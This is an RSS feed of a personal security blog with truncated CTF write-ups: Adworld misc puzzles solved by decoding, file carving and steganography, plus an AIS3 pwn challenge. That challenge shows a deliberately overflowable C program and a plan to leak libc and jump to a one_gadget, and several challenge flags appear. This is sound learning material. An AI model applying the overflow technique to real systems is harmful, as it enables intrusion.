<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on SBK Hugo Site</title><link>https://bernie6401.github.io/tags/ctf/</link><description>Recent content in CTF on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>Adworld - 3-1</title><link>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---3-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---3-1/</guid><description>&lt;h1 id="adworld---3-1">
 Adworld - 3-1
 &lt;a class="anchor" href="#adworld---3-1">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題很簡單，和之前幾題有點像&lt;/p>
&lt;ol>
&lt;li>用file看一下給的檔案是一個&lt;code>.rar&lt;/code>壓縮檔，改個副檔名後解壓縮出現另外一個檔案&lt;/li>
&lt;li>再用file看一下是一個pcapng檔案，用wireshark分析&lt;/li>
&lt;li>用一些基本的技巧(Follow TCP Stream/Extract Object&amp;hellip;)看tcp stream，會發現一個bash的command紀錄，有一個python enc/dec flow，和一串base64的string，除此之外還可以用extract object把一些file dump下來，發現是另外一個加密的flag.rar檔案，我們的任務就是要從這個pcapng檔案中把加密的密碼找出來
&lt;img src="https://hackmd.io/_uploads/H1iy1vf5h.png" alt="" />&lt;/li>
&lt;li>用python腳本解密base64 string，會輸出&lt;code>b'passwd={No_One_Can_Decrypt_Me}\x00\x00'&lt;/code>&lt;/li>
&lt;li>解密壓縮檔flag就出來了&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Write Byte Data&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> base64 &lt;span style="color:#f92672">import&lt;/span> b64decode
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> zipfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;./basezip.txt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;,&amp;#39;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f1 &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;./cipher.zip&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;wb&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f1&lt;span style="color:#f92672">.&lt;/span>write(b64decode(f))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(bytes&lt;span style="color:#f92672">.&lt;/span>fromhex(b64decode(f)&lt;span style="color:#f92672">.&lt;/span>hex())&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;cp437&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f1&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Decrypt Part&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Cipher &lt;span style="color:#f92672">import&lt;/span> AES
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> base64
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>IV &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;QWERTYUIOPASDFGH&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>str1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;19aaFYsQQKr+hVX6hl2smAUQ5a767TsULEUebWSajEo=&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">decrypt&lt;/span>(encrypted):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> aes &lt;span style="color:#f92672">=&lt;/span> AES&lt;span style="color:#f92672">.&lt;/span>new(IV, AES&lt;span style="color:#f92672">.&lt;/span>MODE_CBC, IV)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> aes&lt;span style="color:#f92672">.&lt;/span>decrypt(encrypted)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">encrypt&lt;/span>(message):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> length &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> count &lt;span style="color:#f92672">=&lt;/span> len(message)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> padding &lt;span style="color:#f92672">=&lt;/span> length &lt;span style="color:#f92672">-&lt;/span> (count &lt;span style="color:#f92672">%&lt;/span> length)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> message &lt;span style="color:#f92672">=&lt;/span> message &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\0&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> padding
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> aes &lt;span style="color:#f92672">=&lt;/span> AES&lt;span style="color:#f92672">.&lt;/span>new(IV, AES&lt;span style="color:#f92672">.&lt;/span>MODE_CBC, IV)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> aes&lt;span style="color:#f92672">.&lt;/span>encrypt(message)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>str &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;this is a test&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>example &lt;span style="color:#f92672">=&lt;/span> decrypt(base64&lt;span style="color:#f92672">.&lt;/span>b64decode(str1))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(example)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.csdn.net/yoyoko_chan/article/details/117660494">【攻防世界AD】Misc进阶区：3-1&lt;/a>&lt;/p></description></item><item><title>Adworld - miao~</title><link>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---miao~/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---miao~/</guid><description>&lt;h1 id="adworld---miao">
 Adworld - miao~
 &lt;a class="anchor" href="#adworld---miao">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這題也是看了別人的WP&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>和官解&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>用foremost搜索或救援檔案(神奇的解法，一開始完全想不到)&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ foremost -v miao\~.jpg
Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
Audit File

Foremost started at Sat Jul 15 15:21:29 2023
Invocation: foremost -v miao~.jpg
Output directory: /home/sbk6401/CTF/Adworld/Misc/miao~/output
Configuration file: /etc/foremost.conf
Processing: miao~.jpg
|------------------------------------------------------------------
File: miao~.jpg
Start: Sat Jul 15 15:21:29 2023
Length: 1 MB (1242752 bytes)

Num Name (bs=512) Size File Offset Comment

0: 00000000.jpg 55 KB 0
1: 00000111.wav 1 MB 57212
*|
Finish: Sat Jul 15 15:21:29 2023

2 FILES EXTRACTED

jpg:= 1
rif:= 1
------------------------------------------------------------------

Foremost finished at Sat Jul 15 15:21:29 2023
&lt;/code>&lt;/pre>&lt;p>可以看到抓到其中有一個&lt;code>.wav&lt;/code>檔案&lt;/p></description></item><item><title>Adworld - Misc文件類型</title><link>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---misc%E6%96%87%E4%BB%B6%E9%A1%9E%E5%9E%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---misc%E6%96%87%E4%BB%B6%E9%A1%9E%E5%9E%8B/</guid><description>&lt;h1 id="adworld---misc文件類型">
 Adworld - Misc文件類型
 &lt;a class="anchor" href="#adworld---misc%e6%96%87%e4%bb%b6%e9%a1%9e%e5%9e%8b">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>3436455341425F554573444242514141
41414941416C64434658714F7737634B
4141414143594141414149414141415A
6D78685A7935306548524C79306C4D72
7A5A49536B303253457778546B6B304D
6A5130546A593353445531534573784E
544D3054374A494E552B7A7241554155
45734241685141464141414141674143
56304956656F374474776F414141414A
674141414167414A4141414141414141
414167414141414141414141475A7359
57637564486830436741674141414141
41414241426741477845666B39697132
41456245522B54324B725941514A462B
34725971746742554573464267414141
41414241414541576741414145344141
4141414141
&lt;/code>&lt;/pre>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題有一點通靈，沒有很喜歡&lt;/p>
&lt;ol>
&lt;li>首先給的cipher很明顯是ascii的hex&lt;/li>
&lt;li>轉換過後也很明顯是base64&lt;/li>
&lt;li>在轉換過後，只有底線後面的部分要轉換成hex&lt;/li>
&lt;li>如果把東西print出來的話會看到flag.txt的字樣，感覺上是一個file的byte code，到file signature去看會發現magic header是一個zip file，uncompress之後就會發現flag.txt
&lt;img src="https://hackmd.io/_uploads/H10OlHGch.png" alt="" />&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> base64
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cipher &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;3436455341425F55457344424251414141414941416C64434658714F7737634B4141414143594141414149414141415A6D78685A7935306548524C79306C4D727A5A49536B303253457778546B6B304D6A5130546A593353445531534573784E544D3054374A494E552B7A72415541554573424168514146414141414167414356304956656F374474776F414141414A674141414167414A4141414141414141414167414141414141414141475A73595763756448683043674167414141414141414241426741477845666B3969713241456245522B54324B725941514A462B34725971746742554573464267414141414142414145415767414141453441414141414141&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cipher &lt;span style="color:#f92672">=&lt;/span> bytes&lt;span style="color:#f92672">.&lt;/span>fromhex(cipher)&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34;_&amp;#34;&lt;/span>)[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cipher &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64decode(cipher &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;==&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;./cipher.zip&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;wb&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f&lt;span style="color:#f92672">.&lt;/span>write(cipher)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> zipfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">with&lt;/span> zipfile&lt;span style="color:#f92672">.&lt;/span>ZipFile(&lt;span style="color:#e6db74">&amp;#39;./cipher.zip&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> zip_ref:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> zip_ref&lt;span style="color:#f92672">.&lt;/span>extractall(&lt;span style="color:#e6db74">&amp;#39;./&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;./flag.txt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(f)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python exp.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag&lt;span style="color:#f92672">{&lt;/span>0bec0ad3da2113c70e50fd5617b8e7f9&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://juejin.cn/post/7166166845395828772">XCTF-MISC-Misc文件類型&lt;/a>&lt;/p></description></item><item><title>Adworld - pure_color</title><link>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---pure_color/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---pure_color/</guid><description>&lt;h1 id="adworld---pure_color">
 Adworld - pure_color
 &lt;a class="anchor" href="#adworld---pure_color">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-adworld-ctf-misc">
 tags: &lt;code>Adworld&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-adworld-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://adworld.xctf.org.cn/challenges/details?hash=f216ffab-e01d-46b8-9d4d-d91ab5229eed_2&amp;amp;task_category_id=1">https://adworld.xctf.org.cn/challenges/details?hash=f216ffab-e01d-46b8-9d4d-d91ab5229eed_2&amp;task_category_id=1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10278407">【Day21】隱寫技術 Steganography&lt;/a>
&lt;a href="https://blog.csdn.net/dyw_666666/article/details/88650738">图片隐写查看神器stegsolve使用方法&lt;/a>
&lt;a href="https://github.com/zardus/ctf-tools/blob/master/stegsolve/install"> zardus/ctf-tools - stegsolve&lt;/a>&lt;/p>
&lt;h2 id="exploit---basic-steganography">
 Exploit - Basic Steganography
 &lt;a class="anchor" href="#exploit---basic-steganography">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://i.imgur.com/YnqxcmS.png" alt="" />&lt;/p></description></item><item><title>Adworld - 心儀的公司</title><link>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---%E5%BF%83%E5%84%80%E7%9A%84%E5%85%AC%E5%8F%B8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---%E5%BF%83%E5%84%80%E7%9A%84%E5%85%AC%E5%8F%B8/</guid><description>&lt;h1 id="adworld---心儀的公司">
 Adworld - 心儀的公司
 &lt;a class="anchor" href="#adworld---%e5%bf%83%e5%84%80%e7%9a%84%e5%85%ac%e5%8f%b8">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-adworld-ctf-misc">
 tags: &lt;code>Adworld&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-adworld-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://adworld.xctf.org.cn/challenges/details?hash=ed5d10bf-be47-4e61-b04e-3a9ccb73ff95_2&amp;amp;task_category_id=1">https://adworld.xctf.org.cn/challenges/details?hash=ed5d10bf-be47-4e61-b04e-3a9ccb73ff95_2&amp;task_category_id=1&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ strings webshell.pcapng | grep &amp;#34;{&amp;#34;
...
fl4g:{ftop_Is_Waiting_4_y}
&lt;/code>&lt;/pre>&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.cnblogs.com/Flat-White/p/13526539.html">心仪的公司writeup&lt;/a>
&lt;a href="https://www.bilibili.com/video/BV1r5411h7aw/?p=2&amp;amp;share_source=copy_web&amp;amp;vd_source=31529c2d248aba29c9cc1e3cbd720cb6&amp;amp;t=294">【CTF视频合辑】MISC-流量分析题大集合(第一辑)&lt;/a>&lt;/p></description></item><item><title>Adworld - 適合作為桌面</title><link>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---%E9%81%A9%E5%90%88%E4%BD%9C%E7%82%BA%E6%A1%8C%E9%9D%A2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---%E9%81%A9%E5%90%88%E4%BD%9C%E7%82%BA%E6%A1%8C%E9%9D%A2/</guid><description>&lt;h1 id="adworld---適合作為桌面">
 Adworld - 適合作為桌面
 &lt;a class="anchor" href="#adworld---%e9%81%a9%e5%90%88%e4%bd%9c%e7%82%ba%e6%a1%8c%e9%9d%a2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-adworld-ctf-misc">
 tags: &lt;code>Adworld&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-adworld-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://adworld.xctf.org.cn/challenges/details?hash=7a4e06c0-811c-4493-a628-886dc5bd59b4_2&amp;amp;task_category_id=1">適合作為桌面&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10185442">Day8 Python基礎-pyc是什麼&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Analyze Steganography
&lt;img src="https://i.imgur.com/AwAHrxC.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://products.aspose.app/barcode/recognize/qr#/recognized">QR Code Reader&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-!" data-lang
&lt;/code>&lt;/pre>&lt;p>It seems a byte code of a file.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>HxD
&lt;img src="https://i.imgur.com/ntC6hJ3.png" alt="" />
It can be disassembled by pyc tools.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://tool.lu/pyc/">&lt;code>pyc&lt;/code> disassemble&lt;/a>
:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">def flag():
 str = [
 102,
 108,
 97,
 103,
 123,
 51,
 56,
 97,
 53,
 55,
 48,
 51,
 50,
 48,
 56,
 53,
 52,
 52,
 49,
 101,
 55,
 125,
 ]
 flag = &amp;#34;&amp;#34;
 for i in str:
 flag += chr(i)
 print flag
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>AIS3 EOF 2023 初賽</title><link>https://bernie6401.github.io/docs/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/</guid><description>&lt;h1 id="ais3-eof-2023-初賽">
 AIS3 EOF 2023 初賽
 &lt;a class="anchor" href="#ais3-eof-2023-%e5%88%9d%e8%b3%bd">#&lt;/a>
&lt;/h1>
&lt;h2 id="pwn">
 PWN
 &lt;a class="anchor" href="#pwn">#&lt;/a>
&lt;/h2>
&lt;h3 id="real_rop">
 real_rop
 &lt;a class="anchor" href="#real_rop">#&lt;/a>
&lt;/h3>
&lt;h4 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>Challenge &lt;a href="https://share.ctf.zoolab.org/">URL&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Folder structure:&lt;/p>
&lt;pre tabindex="0">&lt;code>Share
├── share
│ ├── chal
│ ├── flag
│ ├── Makefile
│ ├── real_rop++.c
│ └── run.sh
├── docker-compose.yaml
├── Dockerfile
└── xinetd
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h4 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h4>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;unistd.h&amp;gt;

int main()
{
 char buf[0x10];

 read(0, buf, 0x30);
 write(1, buf, 0x30);
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-make!" data-lang="make!">gcc -fno-stack-protector -o chal real_rop++.c
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Obviously buffer overflow but not much&lt;/li>
&lt;li>Preliminary idea is &lt;code>one_gadget&lt;/code>&lt;/li>
&lt;li>Check protector
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ checksec chal
[*] &amp;#39;/home/sbk6401/CTF/AIS3/PWN/real_rop/share/chal&amp;#39;
 Arch: amd64-64-little
 RELRO: Full RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: PIE enabled
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;code>PIE&lt;/code> is enabled → use write function to leak &lt;code>libc&lt;/code> address&lt;/li>
&lt;li>&lt;code>Full RELRO&lt;/code> → cannot use &lt;code>GOT hijacking&lt;/code>&lt;/li>
&lt;li>Refer to &lt;a href="https://hackmd.io/Prmz9YuOQsiHGXrTuYMzFw?view#Real_rop">大神write up&lt;/a>, we cannot leak &lt;code>libc&lt;/code> address and get shell at one time. So, we can control &lt;code>$rip&lt;/code> and return to the beginning of &lt;code>main&lt;/code> function and go through the process again. That is, &lt;font color="FF0000">we have another &lt;code>read&lt;/code> function&lt;/font> to fill in &lt;code>one_gadget&lt;/code>.&lt;/li>
&lt;li>Note that, &lt;strong>the version of Ubuntu and Glibc is VERY VERY important&lt;/strong>, according to &lt;code>Dockerfile&lt;/code>, it seems use Ubuntu 20.04 with default
&lt;pre tabindex="0">&lt;code class="language-dockerfile!" data-lang="dockerfile!">FROM ubuntu:20.04
MAINTAINER u1f383

RUN apt-get update &amp;amp;&amp;amp; \
 DEBAIN_FRONTEND=noninteractive apt-get install -qy xinetd

RUN useradd -m chal
RUN chown -R root:root /home/chal
RUN chmod -R 755 /home/chal

CMD [&amp;#34;/usr/sbin/xinetd&amp;#34;, &amp;#34;-dontfork&amp;#34;]
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h4 id="analyze-where-to-return">
 Analyze where to return
 &lt;a class="anchor" href="#analyze-where-to-return">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>&lt;font color="FF0000">&lt;strong>&lt;code>For Ubuntu 22.04 &amp;amp;　GLIBC 2.35&lt;/code> - back to &lt;code>__libc_start_main+121&lt;/code>&lt;/strong>&lt;/font>&lt;/p></description></item><item><title>AIS3 EOF 2024</title><link>https://bernie6401.github.io/docs/security/competition/ais3-eof-2024/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/ais3-eof-2024/</guid><description>&lt;h1 id="ais3-eof-2024">
 AIS3 EOF 2024
 &lt;a class="anchor" href="#ais3-eof-2024">#&lt;/a>
&lt;/h1>
&lt;p>&lt;img src="https://hackmd.io/_uploads/BkNtOJddp.png" alt="圖片" />&lt;/p>
&lt;h2 id="crypto">
 Crypto
 &lt;a class="anchor" href="#crypto">#&lt;/a>
&lt;/h2>
&lt;h3 id="baby-rsa">
 Baby RSA
 &lt;a class="anchor" href="#baby-rsa">#&lt;/a>
&lt;/h3>
&lt;h4 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h4>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#! /usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> bytes_to_long, long_to_bytes, getPrime
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">encrypt&lt;/span>(m, e, n):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> enc &lt;span style="color:#f92672">=&lt;/span> pow(bytes_to_long(m), e, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> enc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">decrypt&lt;/span>(c, d, n):
